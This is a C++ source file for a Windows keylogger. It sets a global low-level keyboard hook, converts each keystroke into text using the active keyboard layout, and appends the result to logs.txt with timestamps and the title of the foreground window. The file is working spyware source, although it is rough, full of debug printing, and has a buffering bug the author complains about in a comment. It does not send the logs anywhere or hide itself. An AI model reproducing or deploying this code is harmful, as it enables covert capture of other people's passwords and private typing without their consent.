#pragma comment(lib, "User32.lib")
#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <Winuser.h>
#include <ctime>
#include <chrono>


std::string g_prevWindow;

/* getDate() is called on each log, it uses sprintf to easily get the format we want [DD-MM-YYYY HH:MM:SS] */

std::string getDate() {
	struct tm* timeinfo;
	char timestr[21];
	time_t rawtime;

	time(&rawtime);
	//std::cout << time(NULL) << std::endl;
	timeinfo = localtime(&rawtime);
	//std::cout << timeinfo->tm_mday << std::endl;
	//fprintf??
	sprintf(timestr, "[%02d-%02d-%d %02d:%02d:%02d]", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
	return (timestr);
}

/* getWindowTitle() is also called on each log, it gets the the foreground process ID then calls GetWindowText to get the window title*/

std::string getWindowTitle(){
	HWND fgw = GetForegroundWindow();
	char windowtitle[256];

	GetWindowText(fgw, windowtitle, sizeof(windowtitle));
	//std::cout << "{{" << fgw << "}}";
	return windowtitle;
}

/* Write the date, window title and buffer content to the logfile */

void writeLogs(std::string buf, std::string windowTitle) {
	std::fstream logfile;

	logfile.open("logs.txt", std::ios::app);
	std::cout << "||||WRITING TO FILE||||";
	logfile << getDate();
	logfile << " - '";
	logfile << windowTitle;
	logfile << "' - ";
	logfile << buf << std::endl;
	logfile.close();
}

/* TranslateKeys() is called on each keypress and simply converts the key press from VK_code to a writable character */

std::string translateKeys(int key){
	std::string result;
	if (key == VK_SPACE)
		result = " ";
	else if (key == VK_RETURN)
		result = "\n";
	else if (key == VK_BACK)
		result = "[DEL]";
	else if (key == VK_TAB)
		result = "\t";
	else if (key == VK_LSHIFT || key == VK_RSHIFT)
		result = "[SHIFT]";
	else if (key == VK_LCONTROL || key == VK_RCONTROL)
		result = "[CTRL]";
	else if (key == VK_MENU)
		result = "[ALT]";
	else if (key == VK_CAPITAL)
		result = "[CAPS]";
	else if (key == VK_ESCAPE)
		result = "[ESC]";
	else if (key == VK_LEFT)
		result = "[LEFT ARROW]";
	else if (key == VK_RIGHT)
		result = "[RIGHT ARROW]";
	else if (key == VK_UP)
		result = "[UP ARROW]";
	else if (key == VK_DOWN)
		result = "[DOWN ARROW]";
	else if (key == VK_SNAPSHOT)
		result = "[PRINT SCREEN]";
	else if (key == VK_NUMLOCK)
		result = "[NUMLOCK]";
	else if (key == VK_LWIN)
		result = "[WINDOWS]";
	else if (key == 255)
		result = "[FN]";
	else if (key >= 112 && key <=120){
		result = "[F";
		result += key-63; // 112-63=49(ascii for '1');		
		result += ']';
	}
	else if (key == 121)
		result = "[F10]";
	else if (key == 122)
		result = "[F11]";
	else if (key == 123)
		result = "[F12]";
	//12!@#$
	//Now french &é"'(-è_çà)=
	else{//we use the following line to get wScanCode to pass to "ToUnicodeEx()" from MSDN, this function takes a VK_KEY and a flag to specify the type of conversion 
		HWND hForegroundProcess = GetForegroundWindow();
		BYTE lpKeyState[256];
		wchar_t buff[5];
		//WORD buff[5];
		//LPDWORD lpdwProcessId;
		DWORD lpdwProcessId;
		DWORD dwThreadID = GetWindowThreadProcessId(hForegroundProcess, &lpdwProcessId);
		HKL keyboardLayout = GetKeyboardLayout(dwThreadID);
		UINT wScanCode = MapVirtualKeyEx(key, MAPVK_VK_TO_VSC, keyboardLayout);
		GetKeyState(VK_SHIFT);
        GetKeyState(VK_MENU);
		if (GetKeyboardState(lpKeyState) == 0){
			std::cout << "!!!!!!!! ERROR IN KEYBOARD STATE" << std::endl;
		}
		int ret = ToUnicodeEx(key, wScanCode, lpKeyState, buff, 5, 0, keyboardLayout); //
		//int ret = ToAsciiEx(key, wScanCode, lpKeyState, buff, 0, keyboardLayout);
		std::cout << "ToUnicodeEx ret" << ret << std::endl; 
		result += buff[0];
		std::wcout << "BUFFFFFFFFFFFERs: " << buff << std::endl;
		printf("{{{%c}}}key : %d, char : %c\n", result[0], key, MapVirtualKeyEx(key, MAPVK_VK_TO_CHAR
, keyboardLayout));
	}
	// add shift and caps lock statements later
	//printLocale();
	return result;
}

LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
    KBDLLHOOKSTRUCT *s = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
    std::string finalChar;
	std::string buf;
	std::string currentWindow;

    if (wParam == WM_KEYDOWN){
        finalChar = translateKeys(s->vkCode);
		// for some fucking reason this doesn't append
        buf += finalChar;
        printf("<<final char: %s, buf: %s, cat: >>\n", finalChar.data());
		currentWindow = getWindowTitle();
		printf("@@BUF LENGTH %d@@", buf.length());
        if (buf.length() >= 100 || (currentWindow != g_prevWindow && buf.length() > 0))
				{
					writeLogs(buf, g_prevWindow);
					buf.clear();
					g_prevWindow = currentWindow;
				}
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}


void main() {
    HHOOK keyboard;
    
    g_prevWindow = getWindowTitle();
    keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, &keyboardHook, 0, 0);
    MSG message;
    while (GetMessage(&message, NULL, NULL, NULL) > 0) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    UnhookWindowsHookEx(keyboard);
}

//qwqwqwazer&é"'ééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééé